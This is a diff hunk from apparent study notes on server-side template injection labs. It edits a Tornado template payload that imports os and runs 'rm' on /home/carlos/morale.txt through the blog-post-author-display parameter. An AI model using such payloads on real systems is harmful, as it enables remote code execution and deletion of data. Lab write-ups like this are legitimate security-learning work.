@@ -182,7 +182,7 @@ RUBY ERB template
 
 lab2：
 PYTHON Tornado template
-blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
+blog-post-author-display=user.name } } { % 25+import+os+%25 } { { os.system('rm%20/home/carlos/morale.txt')
 ```
 
 #### Read about the security implications
